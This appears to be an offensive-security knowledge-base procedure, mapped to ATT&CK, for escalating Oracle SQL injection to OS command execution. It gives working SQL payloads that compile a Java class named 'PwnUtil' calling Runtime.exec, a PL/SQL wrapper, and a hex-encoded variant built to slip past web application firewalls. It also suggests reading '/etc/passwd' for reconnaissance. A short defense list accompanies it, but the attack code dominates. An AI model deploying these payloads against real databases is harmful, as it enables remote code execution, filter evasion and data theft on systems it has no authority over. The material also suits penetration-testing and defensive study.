---
id: a6b6641a-2019-4681-9191-75d58b19fc6d
name: Oracle-Java-Class-OS-Command-Execution
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:35.345225+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - >-
    [[techniques/Exploitation-of-Remote-Services|T1210 - Exploitation of Remote
    Services]]
sub_techniques: []
tags:
  - '[[tags/Oracle-Java-Class]]'
  - '[[tags/Oracle-SQL-Command-Execution]]'
  - '[[tags/Oracle-SQL-Injection]]'
commands: []
platforms:
  - Database
  - Oracle
tools: []
validated: true
---

# Oracle-Java-Class-OS-Command-Execution

## Summary

This procedure exploits SQL injection vulnerabilities in Oracle databases to create and compile a malicious Java class that enables arbitrary OS command execution and file reading on the underlying server. By injecting Java source code via SQL statements, attackers can establish a persistent mechanism for remote code execution without direct shell access.

## Description

In Oracle databases, Java stored procedures can be created and compiled directly within the database using SQL commands. This procedure leverages SQL injection to inject and compile a Java class named 'PwnUtil' containing methods for running OS commands (via Runtime.exec) and reading files. A wrapper PL/SQL function 'PwnUtilFunc' exposes these Java methods to SQL queries, allowing command execution through simple SELECT statements. Two variants are provided: a direct injection for unrestricted environments and a hex-encoded version to bypass web application firewalls (WAFs) or input filters that block Java keywords. This technique targets Oracle database servers exposed via web applications, enabling attackers to escalate from SQL injection to full system compromise, such as data exfiltration or lateral movement.

## Requirements

1. Valid SQL injection point in an Oracle database-connected application (e.g., unparameterized queries in a web form).
2. Database privileges allowing DDL operations like CREATE JAVA SOURCE and CREATE FUNCTION (often granted to PUBLIC or low-privilege users).
3. Access to an Oracle SQL client like SQL*Plus or a web-based query interface for injecting the payloads.
4. Knowledge of the target OS for crafting effective commands (e.g., 'ping' for Linux/Unix, 'dir' for Windows).

## Defense

- Use prepared statements and parameterized queries to prevent SQL injection.
- Apply principle of least privilege: Revoke CREATE JAVA and CREATE PROCEDURE from non-admin users.
- Enable database auditing for DDL events and monitor for suspicious Java class creations.
- Deploy WAFs with rules to detect hex-encoded payloads and Java-related keywords in SQL inputs.
- Regularly scan for and remove unauthorized Java classes using queries like SELECT * FROM USER_JAVA_CLASSES.

## Objectives

1. Compile a custom Java class within the Oracle database to enable OS command execution.
2. Create a PL/SQL wrapper function to invoke the Java methods via SQL.
3. Execute arbitrary OS commands and read sensitive files on the database server.
4. Achieve remote code execution (RCE) for persistence, exfiltration, or further exploitation.

## Instructions

### Step 1: Identify SQL Injection Vulnerability

**Context**: Confirm the presence of a blind or error-based SQL injection in the target Oracle application to deliver the payload. This step ensures the injection point can execute multi-statement queries.

Test with a basic payload like appending ' AND 1=1 --' to inputs and observing behavior differences.

### Step 2: Deploy Direct Java Class Creation (Unfiltered Environments)

**Context**: In environments without input sanitization, directly inject the SQL to create the Java class and PL/SQL function. This establishes the command execution primitive.

**Code** ([[codes/Oracle-Create-Java-Class-Direct-SQL]]):

```sql
/* create Java class */
BEGIN
EXECUTE IMMEDIATE 'create or replace and compile java source named "PwnUtil" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = "";while ((stemp = myReader.readLine()) != null) str += stemp + "\n";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = "";while((stemp = myReader.readLine()) != null) str += stemp + "\n";myReader.close();return str;} catch (Exception e){ return e.toString();}}};';
END;
/

BEGIN
EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';';
END;
/

/* run OS command */
SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
```

> This payload creates the 'PwnUtil' Java class with 'runCmd' for OS execution and 'readFile' for file access. The PL/SQL function wraps 'runCmd'. Success is indicated by the ping output (e.g., response times) returned in the query result. If errors occur (e.g., compilation failure), they will be returned as strings.

### Step 3: Deploy Hex-Encoded Java Class Creation (Bypass Filters)

**Context**: If direct injection is blocked (e.g., by WAFs filtering 'java' or 'exec'), use the hex-encoded variant to obfuscate the payload while preserving functionality.

**Code** ([[codes/Oracle-Create-Java-Class-Hex-Encoded-SQL]]):

```sql
/* create Java class */
SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d''));
EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual

/* run OS command */
SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
```

> The hex encoding uses UTL_RAW.CAST_TO_VARCHAR2 and HEXTORAW to decode the Java source at runtime. PRAGMA AUTONOMOUS_TRANSACTION allows commits in a select context. Expected output mirrors the direct method: command results in the query response. Verify by checking for no decode errors and successful function creation.

### Step 4: Execute Commands and Read Files

**Context**: Once deployed, use the PwnUtilFunc for ongoing access. Replace 'ping -c 4 localhost' with targets like 'whoami', 'cat /etc/passwd', or 'net user' for reconnaissance.

Invoke via SELECT PwnUtilFunc('your_command_here') FROM dual; For file reading, create a similar wrapper for readFile if needed.

> Success: Command output appears in the result set. Errors indicate privilege issues or class loading failures.
